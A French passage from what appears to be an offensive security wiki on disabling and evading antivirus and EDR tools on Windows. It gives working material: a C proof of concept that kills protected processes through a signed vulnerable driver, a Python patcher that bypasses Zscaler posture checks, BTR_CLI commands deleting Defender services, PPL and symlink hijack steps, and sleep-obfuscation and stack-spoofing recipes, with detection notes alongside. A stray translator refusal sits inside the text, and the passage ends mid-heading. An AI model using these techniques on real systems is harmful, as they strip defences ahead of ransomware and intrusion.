Storm-2603 a utilisé un petit utilitaire en console appelé **Antivirus Terminator** pour désactiver les protections des points de terminaison avant de déposer un ransomware. L’outil apporte son **propre driver vulnérable mais *signé*** et en abuse pour effectuer des opérations privilégiées au niveau du noyau que même les services AV Protected-Process-Light (PPL) ne peuvent pas bloquer.<sup>[[12]](#references)</sup>

Points clés
1. **Driver signé** : Le fichier déposé sur le disque est `ServiceMouse.sys`, mais le binaire est le driver légitimement signé `AToolsKrnl64.sys` du « System In-Depth Analysis Toolkit » d’Antiy Labs. Comme le driver possède une signature Microsoft valide, il se charge même lorsque Driver-Signature-Enforcement (DSE) est activé.
2. **Installation du service** :
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   La première ligne enregistre le pilote en tant que **service kernel** et la deuxième le démarre afin que `\\.\ServiceMouse` devienne accessible depuis l’espace utilisateur.
3. **IOCTL exposés par le pilote**
   | Code IOCTL | Capacité                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Terminer un processus arbitraire par PID (utilisé pour arrêter les services Defender/EDR) |
   | `0x990000D0` | Supprimer un fichier arbitraire du disque |
   | `0x990001D0` | Décharger le pilote et supprimer le service |

   Proof-of-concept minimal en C :
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Pourquoi cela fonctionne** : BYOVD contourne entièrement les protections en mode utilisateur ; le code exécuté dans le kernel peut ouvrir des processus *protégés*, les terminer ou altérer des objets du kernel, quels que soient PPL/PP, ELAM ou les autres fonctionnalités de hardening.

Détection / mesures d’atténuation  
• Activez la liste de blocage des pilotes vulnérables de Microsoft (`HVCI`, `Smart App Control`) afin que Windows refuse de charger `AToolsKrnl64.sys`.  
• Surveillez la création de nouveaux services *kernel* et déclenchez une alerte lorsqu’un pilote est chargé depuis un répertoire accessible en écriture à tous ou absent de la liste d’autorisation.  
• Surveillez les handles en mode utilisateur vers des objets de périphérique personnalisés, suivis d’appels `DeviceIoControl` suspects.

### Contourner les vérifications de posture de Zscaler Client Connector en modifiant les binaires sur disque

Le **Client Connector** de Zscaler applique localement des règles de posture des appareils et s’appuie sur Windows RPC pour communiquer les résultats aux autres composants. Deux choix de conception faibles rendent un contournement complet possible :

1. L’évaluation de la posture se déroule **entièrement côté client** (un booléen est envoyé au serveur).
2. Les points de terminaison RPC internes vérifient uniquement que l’exécutable qui se connecte est **signé par Zscaler** (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

En **modifiant quatre binaires signés sur disque**, les deux mécanismes peuvent être neutralisés :

| Binaire | Logique d’origine modifiée | Résultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Renvoie toujours `1` : tous les contrôles sont conformes |
| `ZSAService.exe` | Appel indirect à `WinVerifyTrust` | Remplacé par des NOP ⇒ n’importe quel processus (même non signé) peut se connecter aux pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Remplacé par `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Contrôles d’intégrité du tunnel | Court-circuités |

Extrait minimal du patcher :

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Après avoir remplacé les fichiers d’origine et redémarré la stack de services :

* **Tous** les contrôles de posture affichent **vert/conforme**.
* Des binaires non signés ou modifiés peuvent ouvrir les endpoints RPC de named pipe (p. ex. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L’hôte compromis obtient un accès sans restriction au réseau interne défini par les policies Zscaler.

Cette étude de cas montre comment des décisions de confiance purement côté client et de simples vérifications de signature peuvent être contournées avec quelques modifications d’octets.

## Abus de fonctionnalités de confiance de Microsoft Defender `BTR.sys`

Le driver **Boot-Time Removal** de Defender est un contre-exemple intéressant au BYOVD classique. `BTR.sys` est un composant de remédiation légitime signé par Microsoft, sans bug de corruption mémoire ni interface IOCTL ; après avoir obtenu un accès administrateur et `SeLoadDriverPrivilege`, un opérateur peut plutôt falsifier sa transaction privée de remédiation et obtenir les opérations prévues sur les fichiers et le registre en Ring-0. Il s’agit d’une **primitive de neutralisation d’AV/EDR après compromission, et non d’un accès initial ni d’une élévation de privilèges** ; le driver peut être extrait de la ressource `BOOTTIMETOOL` du `MpEngine.dll` de la cible elle-même, plutôt que d’importer un driver tiers voyant.<sup>[[36]](#references)</sup>

### Préparation du driver à usage unique

Defender dépose normalement la ressource dans un fichier aléatoire `[a-z]{8}.sys` et enregistre un service kernel portant un nom similaire. `DriverEntry` lit la valeur `Args` du service, ouvre l’ADS NTFS référencé, déchiffre et valide la liste d’actions, écrit les informations de retour, puis renvoie `0xC0000056` (`STATUS_DELETE_PENDING`) après une exécution réussie, afin que le driver soit déchargé au lieu de rester résident. Un service falsifié présente les valeurs caractéristiques suivantes.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Le flux `:changelist` contient un blob chiffré par RC4. Les builds analysés réutilisent une clé fixe de 256 octets : le chiffrement ne constitue donc pas une frontière d’autorisation. Un plaintext valide comporte un en-tête global de 24 octets (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC d’en-tête et identifiant de transaction dérivé du payload), suivi d’un chemin de feedback UTF-16 terminé par un caractère nul, puis d’un nombre quelconque d’éléments. Chaque élément comporte un en-tête de 16 octets (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) suivi de données propres à l’action, se terminant par **exactement quatre octets NUL**. Chaque région d’en-tête/de données est vérifiée séparément à l’aide du polynôme CRC-32 `0xEDB88320`, d’un état initial `0xFFFFFFFF` et **sans XOR final** (`~CRC32`) ; l’état CRC est réinitialisé pour chaque région.<sup>[[36]](#references)[[37]](#references)</sup>

Les ID d’action acceptés exposent ces primitives du noyau.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Données de l’élément | Résultat |
| --- | --- | --- |
| 1 | `[chemin UTF-16]` | Supprimer un fichier, y compris s’il est verrouillé |
| 2 | `[chemin UTF-16]` | Supprimer un répertoire vide |
| 3 | `[Flags][source][destination]` | Déplacer un fichier vers un chemin protégé choisi par l’attaquant ; une destination vide entraîne sa suppression |
| 4 | `[Flags][chemin de clé]` | Supprimer récursivement une clé de registre |
| 5 | `[Flags][chemin de clé + "\\" + valeur]` | Supprimer une valeur de registre |
| 6 | `[Flags][type][taille][chemin de clé + "\\" + valeur][données]` | Créer/mettre à jour une valeur de registre et créer les chemins de clé manquants |

Pour les actions 5 et 6, le séparateur clé/valeur sur le fil correspond à **deux barres obliques inverses consécutives** ; un chemin au format habituel ne sera pas correctement découpé. Le fichier de feedback reprend en grande partie la requête, mais les quatre premiers octets de données de chaque élément deviennent son `NTSTATUS` résultant. Pour les actions 1 et 2, qui ne comportent pas de champ flags initial, BTR déplace le chemin dans les quatre octets réservés de fin afin de libérer de la place pour ce statut.<sup>[[36]](#references)</sup>

### Workflow `BTR_CLI` et fenêtre de démarrage précoce

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) met en œuvre la chaîne complète : extraire `BTR.sys` de Defender local, créer `<random>.sys:changelist` et un flux de feedback, sérialiser/vérifier les sommes de contrôle/chiffrer des actions chaînées, créer directement la clé de registre du service, puis appeler `NtLoadDriver` pour `-trigger now` ou laisser le pilote comme pilote démarré par le système pour `-trigger boot`. Le staging direct dans le registre évite le chemin normal `CreateServiceW` du SCM et ne génère donc **pas** l’événement d’installation de service 7045. Les artefacts déclenchés au démarrage peuvent ensuite être supprimés avec `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` n’est pas utilisable, car BTR effectue des opérations d’E/S sur des fichiers depuis `DriverEntry`, avant que la pile de stockage et le lien `SystemRoot` soient prêts. `Start=1` avec le groupe prioritaire `Boot Bus Extender` s’exécute plutôt pendant la Phase 1 : NTFS est utilisable, mais de nombreux pilotes de sécurité à démarrage système et services EDR en mode utilisateur ne sont pas encore initialisés. Des filtres à démarrage système comme `WdFilter` peuvent déjà être chargés, mais BTR peut supprimer leurs binaires ou leur configuration de service avant le démarrage suivant, et peut supprimer les exécutables des services avant que SCM ne les lance. ELAM ne comble pas cette faille, car BTR s’exécute après l’évaluation des pilotes de démarrage et possède une signature Microsoft valide.<sup>[[36]](#references)</sup>

Plusieurs actions s’exécutent dans une même transaction. Le PoC ajoute en premier l’Action 1 pour le chemin codé en dur `\SystemRoot\Temp\BootClean.log` : BTR crée ce journal, puis exécute sa propre demande de suppression et l’efface avant de se décharger. Cela réduit les traces, tandis que placer les retours dans `<random>.sys:<random>.dat` permet de supprimer le pilote et les deux flux en même temps.<sup>[[36]](#references)[[37]](#references)</sup>

### Corrélations de détection à fort signal

Les règles basées uniquement sur les signatures et la liste de blocage des pilotes vulnérables de Microsoft ne couvrent pas l’abus des fonctionnalités prévues de BTR. Privilégiez ces corrélations comportementales, en distinguant toutefois une chaîne légitime de Defender d’un lanceur quelconque.<sup>[[36]](#references)</sup>

- **Sysmon 15 :** la création de `.sys:changelist` est systématique lors du staging de BTR. Un flux ADS `.dat` associé au même `.sys` est particulièrement suspect, car Defender place normalement ses retours dans `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 sans System 7045 :** corrélez la création directe de `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, contenant `Args=...:changelist` et `Group=Boot Bus Extender`, à l’absence d’événement d’installation SCM correspondant.
- **Sysmon 6 -> 23 :** corrélez le chargement d’un pilote BTR connu issu d’une chaîne autre que Defender avec la suppression ultérieure de fichiers attribuée à `System`/PID 4, en particulier s’il s’agit de binaires de sécurité.
- **Sysmon 11 -> 23 :** déclenchez une alerte en cas de création puis de suppression rapides de `\SystemRoot\Temp\BootClean.log` par `System`/PID 4.
- Restreignez et auditez l’attribution ou l’activation de `SeLoadDriverPrivilege` ; une signature Microsoft ne suffit pas à établir la confiance lorsqu’un pilote d’outil de sécurité est placé par `cmd.exe`, PowerShell ou un processus inconnu.

## Abuser de Protected Process Light (PPL) pour altérer les AV/EDR avec des LOLBINs

Protected Process Light (PPL) applique une hiérarchie de signataires et de niveaux, afin que seuls les processus protégés d’un niveau égal ou supérieur puissent altérer d’autres processus protégés. À des fins offensives, si vous pouvez lancer légitimement un binaire compatible PPL et contrôler ses arguments, vous pouvez détourner une fonctionnalité bénigne (par exemple, la journalisation) pour en faire une primitive d’écriture contrainte, adossée à PPL, ciblant les répertoires protégés utilisés par les AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Ce qui permet à un processus de s’exécuter en tant que PPL
- L’EXE cible (et toutes les DLL chargées) doit être signé avec un EKU compatible PPL.
- Le processus doit être créé avec CreateProcess en utilisant les indicateurs : `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Il faut demander un niveau de protection compatible correspondant au signataire du binaire (par exemple, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` pour les signataires antimalware, `PROTECTION_LEVEL_WINDOWS` pour les signataires Windows). Un niveau incorrect fera échouer la création.

Voir aussi cette introduction plus générale à PP/PPL et à la protection de LSASS :

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Outils de lancement
- Outil auxiliaire open source : CreateProcessAsPPL (sélectionne le niveau de protection et transmet les arguments à l’EXE cible) :
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Modèle d’utilisation :

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Je ne peux pas traduire des instructions opérationnelles visant à contourner PPL et à corrompre des fichiers antivirus pour empêcher leur démarrage.

Résumé non opérationnel : cette section décrit l’abus d’un binaire Windows signé pour écrire dans un répertoire protégé au démarrage, avant que l’antivirus ne verrouille ses fichiers. À des fins défensives, surveillez les services configurés pour démarrer automatiquement et les modifications inattendues dans les répertoires de l’antivirus.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notes et contraintes
- Vous ne pouvez pas contrôler le contenu écrit par ClipUp, seulement son emplacement ; cette primitive convient à la corruption plutôt qu’à l’injection précise de contenu.
- Nécessite des privilèges d’administrateur local/SYSTEM pour installer/démarrer un service et une fenêtre de redémarrage.
- Le timing est crucial : la cible ne doit pas être ouverte ; une exécution au démarrage évite les verrous de fichiers.

Détections
- Création du processus `ClipUp.exe` avec des arguments inhabituels, en particulier lorsqu’il est lancé par des lanceurs non standard au démarrage.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et démarrant systématiquement avant Defender/AV. Recherchez la création ou la modification de services avant les échecs de démarrage de Defender.
- Surveillance de l’intégrité des fichiers binaires/répertoires Platform de Defender ; créations/modifications inattendues de fichiers par des processus dotés d’indicateurs de processus protégé.
- Télémétrie ETW/EDR : recherchez les processus créés avec `CREATE_PROTECTED_PROCESS` et l’utilisation anormale du niveau PPL par des binaires non liés à l’AV.

Mesures d’atténuation
- WDAC/Code Integrity : limitez les binaires signés autorisés à s’exécuter en tant que PPL et les processus parents autorisés ; bloquez l’invocation de ClipUp en dehors des contextes légitimes.
- Hygiène des services : limitez la création/modification des services à démarrage automatique et surveillez la manipulation de l’ordre de démarrage.
- Assurez-vous que la protection contre les altérations de Defender et les protections de lancement anticipé sont activées ; examinez les erreurs de démarrage indiquant une corruption de binaire.
- Envisagez de désactiver la génération de noms courts 8.3 sur les volumes hébergeant des outils de sécurité, si cela est compatible avec votre environnement (testez soigneusement).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender choisit la plateforme depuis laquelle il s’exécute en énumérant les sous-dossiers de :
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Il sélectionne le sous-dossier dont la chaîne de version est la plus élevée selon l’ordre lexicographique (par exemple, `4.18.25070.5-0`), puis démarre les processus du service Defender depuis ce dossier (en mettant à jour les chemins du service/registre en conséquence). Cette sélection fait confiance aux entrées de répertoire, y compris aux points de réanalyse de répertoire (symlinks). Un administrateur peut exploiter cela pour rediriger Defender vers un chemin modifiable par un attaquant et réaliser du DLL sideloading ou perturber le service.<sup>[[21]](#references)[[22]](#references)</sup>

Prérequis
- Administrateur local (nécessaire pour créer des répertoires/symlinks sous le dossier Platform)
- Possibilité de redémarrer ou de déclencher une nouvelle sélection de la plateforme Defender (redémarrage du service au démarrage)
- Outils intégrés uniquement (mklink)

Pourquoi cela fonctionne
- Defender bloque les écritures dans ses propres dossiers, mais sa sélection de plateforme fait confiance aux entrées de répertoire et choisit la version la plus élevée selon l’ordre lexicographique sans vérifier que la cible pointe vers un chemin protégé/de confiance.

Étapes (exemple)
1) Préparez un clone modifiable du dossier de la plateforme actuelle, par exemple `C:\TMP\AV` :
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Créez dans Platform un lien symbolique de répertoire de version supérieure pointant vers votre dossier :
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Sélection du déclencheur (redémarrage recommandé) :
```cmd
shutdown /r /t 0
```
4) Vérifiez que MsMpEng.exe (WinDefend) s’exécute depuis le chemin redirigé :
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Vous devriez observer le nouveau chemin du processus sous `C:\TMP\AV\` et la configuration du service/le registre reflétant cet emplacement.

Options de post-exploitation
- DLL sideloading/exécution de code : Déposez/remplacez des DLL que Defender charge depuis son répertoire d’application afin d’exécuter du code dans les processus de Defender. Voir la section ci-dessus : [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Arrêt du service/déni de service : Supprimez le lien symbolique de version afin qu’au prochain démarrage, le chemin configuré ne soit plus résolu et que Defender ne démarre pas :
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Notez que cette technique ne permet pas à elle seule une élévation de privilèges ; elle nécessite des droits d’administrateur.

## API/IAT Hooking + Call-Stack Spoofing avec PIC (style Crystal Kit)

Les équipes red team peuvent déplacer l’évasion à l’exécution hors de l’implant C2 et dans le module cible lui-même en hookant sa table d’adresses d’importation (IAT) et en redirigeant certaines API vers du code indépendant de la position (PIC) contrôlé par l’attaquant. Cette approche généralise l’évasion au-delà de la petite surface d’API exposée par de nombreux kits (par exemple, CreateProcessA) et étend les mêmes protections aux BOF et aux DLL de post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approche générale
- Charger un blob PIC à côté du module cible à l’aide d’un chargeur réflexif (préfixé ou compagnon). Le PIC doit être autonome et indépendant de la position.
- Au chargement de la DLL hôte, parcourir son IMAGE_IMPORT_DESCRIPTOR et modifier les entrées IAT des imports ciblés (par exemple, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) pour les faire pointer vers de minces wrappers PIC.
- Chaque wrapper PIC exécute des techniques d’évasion avant d’appeler l’adresse de l’API réelle. Les techniques d’évasion courantes incluent :
  - Masquer/démasquer la mémoire autour de l’appel (par exemple, chiffrer les régions du beacon, passer de RWX à RX, modifier les noms/permissions des pages), puis restaurer l’état après l’appel.
  - Spoofing de la call stack : construire une pile bénigne et effectuer la transition vers l’API cible afin que l’analyse de la call stack retrouve les frames attendues.<sup>[[9]](#references)</sup>
- Pour assurer la compatibilité, exporter une interface permettant à un script Aggressor (ou équivalent) d’enregistrer les API à hooker pour Beacon, les BOF et les DLL de post-exploitation.

Pourquoi utiliser l’IAT hooking ici
- Fonctionne avec tout code utilisant l’import hooké, sans modifier le code de l’outil ni dépendre de Beacon pour proxyfier certaines API.
- Couvre les DLL de post-exploitation : le hooking de LoadLibrary* permet d’intercepter les chargements de modules (par exemple, System.Management.Automation.dll, clr.dll) et d’appliquer le même masquage et la même évasion de call stack à leurs appels d’API.
- Rétablit l’utilisation fiable des commandes de post-exploitation qui créent des processus face aux détections basées sur la call stack, en wrappant CreateProcessA/W.

Exemple minimal de hook IAT (pseudocode C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Appliquez le patch après les relocations/ASLR et avant la première utilisation de l’importation. Les chargeurs réflexifs comme TitanLdr/AceLdr montrent comment effectuer le hooking dans le DllMain du module chargé.
- Gardez les wrappers compacts et compatibles PIC ; résolvez la véritable API à partir de la valeur IAT d’origine capturée avant le patch ou via LdrGetProcedureAddress.
- Utilisez des transitions RW → RX pour le PIC et évitez de laisser des pages inscriptibles et exécutables.

Stub de falsification de la pile d’appels
- Les stubs PIC de type Draugr construisent une fausse chaîne d’appels (adresses de retour dans des modules bénins), puis basculent vers la véritable API.
- Cela déjoue les détections qui s’attendent à trouver des piles d’appels canoniques provenant de Beacon/BOFs lors des appels à des API sensibles.
- Combinez cette technique avec le stack cutting/stack stitching pour atteindre les frames attendues avant le prologue de l’API.

Intégration opérationnelle
- Ajoutez le chargeur réflexif au début des DLL post-exploitation afin que le PIC et les hooks s’initialisent automatiquement au chargement de la DLL.
- Utilisez un script Aggressor pour enregistrer les API cibles, afin que Beacon et les BOFs bénéficient de la même voie d’évasion en toute transparence, sans modification du code.

Considérations de détection/DFIR
- Intégrité de l’IAT : entrées résolues vers des adresses hors image (heap/anonymes) ; vérification périodique des pointeurs d’importation.
- Anomalies de pile : adresses de retour n’appartenant pas aux images chargées ; transitions abruptes vers du PIC hors image ; ascendance RtlUserThreadStart incohérente.
- Télémétrie du chargeur : écritures dans l’IAT au sein du processus, activité précoce de DllMain modifiant les thunks d’importation, régions RX inattendues créées au chargement.
- Évasion du chargement d’images : en cas de hooking de LoadLibrary*, surveillez les chargements suspects d’assemblies automation/clr corrélés à des événements de masquage mémoire.

Briques de base et exemples associés
- Chargeurs réflexifs qui effectuent le patching de l’IAT au chargement (p. ex. TitanLdr, AceLdr)
- Hooks de masquage mémoire (p. ex. simplehook) et PIC de stack cutting (stackcutting)
- Stubs PIC de falsification de pile d’appels (p. ex. Draugr)


## Hooking IAT au moment de l’importation + Sleep Obfuscation (Crystal Palace/PICO)

### Hooks IAT au moment de l’importation via un PICO résident

Si vous contrôlez un chargeur réflexif, vous pouvez effectuer le hooking des importations **pendant** `ProcessImports()` en remplaçant le pointeur `GetProcAddress` du chargeur par un résolveur personnalisé qui vérifie d’abord les hooks :<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Construisez un **PICO résident** (objet PIC persistant) qui subsiste après la libération du PIC temporaire du chargeur.
- Exportez une fonction `setup_hooks()` qui remplace le résolveur d’importation du chargeur (p. ex. `funcs.GetProcAddress = _GetProcAddress`).
- Dans `_GetProcAddress`, ignorez les importations par ordinal et utilisez une recherche de hooks basée sur le hash, telle que `__resolve_hook(ror13hash(name))`. Si un hook existe, renvoyez-le ; sinon, déléguez au véritable `GetProcAddress`.
- Enregistrez les cibles des hooks au moment de l’édition des liens avec les entrées Crystal Palace `addhook "MODULE$Func" "hook"`. Le hook reste valide puisqu’il se trouve dans le PICO résident.

Cela permet une **redirection IAT au moment de l’importation**, sans modifier la section de code de la DLL chargée après son chargement.

### Forcer les importations susceptibles d’être hookées lorsque la cible utilise le parcours du PEB

Les hooks au moment de l’importation ne se déclenchent que si la fonction figure réellement dans l’IAT de la cible. Si un module résout les API via un parcours du PEB et un hash (sans entrée d’importation), forcez une véritable importation afin que le chemin `ProcessImports()` du chargeur la traite :

- Remplacez la résolution d’exports par hash (p. ex. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) par une référence directe comme `&WaitForSingleObject`.
- Le compilateur émet une entrée IAT, permettant l’interception lorsque le chargeur réflexif résout les importations.

### Obfuscation du sommeil/de l’inactivité de type Ekko sans patcher `Sleep()`

Au lieu de patcher `Sleep`, effectuez le hooking des **primitives d’attente/IPC réellement utilisées par l’implant** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Pour les attentes longues, encapsulez l’appel dans une chaîne d’obfuscation de type Ekko qui chiffre l’image en mémoire pendant les périodes d’inactivité :<sup>[[31]](#references)[[27]](#references)</sup>

- Utilisez `CreateTimerQueueTimer` pour planifier une séquence de callbacks qui appellent `NtContinue` avec des frames `CONTEXT` préparées.
- Chaîne typique (x64) : définir l’image en `PAGE_READWRITE` → chiffrer avec RC4 via `advapi32!SystemFunction032` l’image mappée entière → effectuer l’attente bloquante → déchiffrer avec RC4 → **restaurer les permissions de chaque section** en parcourant les sections PE → signaler la fin.
- `RtlCaptureContext` fournit un modèle de `CONTEXT` ; clonez-le dans plusieurs frames et définissez les registres (`Rip/Rcx/Rdx/R8/R9`) pour appeler chaque étape.

Détail opérationnel : renvoyez « success » pour les attentes longues (p. ex. `WAIT_OBJECT_0`) afin que l’appelant poursuive son exécution pendant que l’image est masquée. Ce schéma dissimule le module aux scanners pendant les périodes d’inactivité et évite la signature classique du « `Sleep()` patché ».

Idées de détection (basées sur la télémétrie)
- Rafales de callbacks `CreateTimerQueueTimer` pointant vers `NtContinue`.
- Utilisation de `advapi32!SystemFunction032` sur de grands tampons contigus de la taille d’une image.
- Appel de `VirtualProtect` sur une grande plage, suivi de la restauration personnalisée des permissions de chaque section.

### Enregistrement CFG à l’exécution pour les gadgets de Sleep Obfuscation

Sur les cibles où CFG est activé, le premier saut indirect vers un gadget au milieu d’une fonction, tel que `jmp [rbx]` ou `jmp rdi`, provoque généralement un plantage du processus avec `STATUS_STACK_BUFFER_OVERRUN`, car le gadget ne figure pas dans les métadonnées CFG du module. Pour que les chaînes de type Ekko/Kraken fonctionnent dans des processus renforcés :<sup>[[30]](#references)</sup>

- Enregistrez chaque destination indirecte utilisée par la chaîne avec `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` et des entrées `CFG_CALL_TARGET_VALID`.
- Pour les adresses situées dans des images chargées (`ntdll`, `kernel32`, `advapi32`), le `MEMORY_RANGE_ENTRY` doit commencer à la **base de l’image** et couvrir **la taille totale de l’image**.
- Pour les régions mappées manuellement/PIC/stompées, utilisez plutôt la **base d’allocation** et la taille de l’allocation.
- Marquez non seulement le gadget de dispatch, mais aussi les exports atteints indirectement (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, les appels système d’attente/d’événement) et toutes les sections exécutables contrôlées par l’attaquant qui deviendront des cibles indirectes.

Cela transforme les chaînes de sommeil de type ROP/JOP, qui « ne fonctionnent que dans les processus sans CFG », en primitives réutilisables dans `explorer.exe`, les navigateurs, `svchost.exe` et les autres points de terminaison compilés avec `/guard:cf`.

### Falsification de pile compatible CET pour les threads en sommeil

Le remplacement complet du `CONTEXT` est bruyant et peut échouer sur les systèmes CET Shadow Stack, car un `Rip` falsifié doit rester cohérent avec la pile matérielle de retour. Une méthode de masquage du sommeil plus sûre consiste à :<sup>[[30]](#references)</sup>

- Choisir un autre thread du même processus et lire les limites de pile de son `NT_TIB`/TEB (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Sauvegarder le TEB/TIB réel du thread courant.
- Capturer le contexte réel du thread en sommeil avec `GetThreadContext`.
- Copier **uniquement** le `Rip` réel dans le contexte falsifié, en laissant intact l’état falsifié de `Rsp`/de la pile.
- Pendant la période de sommeil, copier le `NT_TIB` du thread falsifié dans le TEB courant afin que les parcours de pile se déroulent dans une plage de pile légitime.
- Une fois l’attente terminée, restaurer le TIB d’origine et le contexte du thread.

Cela préserve un pointeur d’instruction cohérent avec CET tout en induisant en erreur les parcours de pile EDR qui se fient aux métadonnées de pile du TEB pour valider le déroulement de la pile.

### Alternative basée sur les APC : Kraken Mask

Si le dispatch par file d’attente de timers est trop reconnaissable, la même séquence de sommeil-chiffrement-falsification-restauration peut être exécutée par un thread auxiliaire suspendu à l’aide d’APC en file d’attente :<sup>[[27]](#references)</sup>

- Créez un thread auxiliaire dont le point d’entrée est `NtTestAlert`.
- Placez en file des frames `CONTEXT`/APC préparées avec `NtQueueApcThread` et exécutez-les avec `NtAlertResumeThread`.
- Stockez l’état de la chaîne sur le heap plutôt que sur la pile auxiliaire, afin d’éviter d’épuiser la pile de thread par défaut de 64 Ko.
- Utilisez `NtSignalAndWaitForSingleObject` pour signaler atomiquement l’événement de démarrage et bloquer l’exécution.
- Suspendez le thread principal avant de restaurer le TIB/contexte (`NtSuspendThread` → restauration → `NtResumeThread`) afin de réduire la fenêtre de course pendant laquelle un scanner pourrait détecter une pile à moitié restaurée.

Cette méthode remplace la signature `CreateTimerQueueTimer` + `NtContinue` par une signature thread auxiliaire/APC, tout en conservant les mêmes objectifs de masquage RC4 et de falsification de pile.

Idées supplémentaires de détection
- Appel de `NtSetInformationVirtualMemory` avec `VmCfgCallTargetInformation` peu avant les périodes de sommeil, les attentes ou le dispatch d’APC.
- Appels à `GetThreadContext`/`SetThreadContext` encadrant `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ou `ConnectNamedPipe`.
- Appel de `NtQueryInformationThread` suivi d’écritures directes dans les limites de pile TEB/TIB du thread courant.
- Chaînes `NtQueueApcThread`/`NtAlertResumeThread` qui atteignent indirectement `SystemFunction032`, `VirtualProtect` ou des fonctions de restauration des permissions de section.
- Utilisation répétée de signatures de gadgets courtes comme `FF 23` (`jmp [rbx]`) ou `FF E7` (`jmp rdi`) comme pivots de dispatch dans des modules signés.


## Module Stomping de précision

Le Module Stomping exécute des payloads depuis la **section `.text` d’une DLL déjà mappée dans le processus cible**, au lieu d’allouer de la mémoire exécutable privée évidente ou de charger une nouvelle DLL sacrificielle. La cible de l’écrasement doit être une **image chargée depuis le disque** dont l’espace de code peut accueillir le payload sans corrompre les chemins d’exécution dont le processus a encore besoin.<sup>[[1]](#references)[[2]](#references)</sup>

### Sélection fiable de la cible

